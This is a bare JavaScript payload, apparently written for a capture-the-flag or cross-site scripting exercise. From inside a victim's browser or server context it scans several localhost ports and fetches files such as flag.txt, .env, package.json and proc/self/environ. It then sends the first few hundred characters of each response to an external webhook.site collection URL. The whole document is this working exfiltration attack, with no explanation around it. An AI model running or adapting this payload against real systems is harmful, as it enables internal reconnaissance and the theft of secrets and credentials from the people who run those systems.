var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
[3000,8080,8081,8888,9000,1337].forEach(p=>{
  fetch('http://127.0.0.1:'+p+'/').then(r=>r.text()).then(t=>fetch(w+'/p'+p+'?d='+encodeURIComponent(t.substring(0,300)))).catch(e=>fetch(w+'/p'+p+'_err?d=1'))
});
['flag.txt','flag','app.js','package.json','.env','proc/self/environ'].forEach(f=>{
  fetch('http://127.0.0.1/'+f).then(r=>r.text()).then(t=>fetch(w+'/f_'+f.replace('/','_')+'?d='+encodeURIComponent(t.substring(0,400)))).catch(e=>{})
});
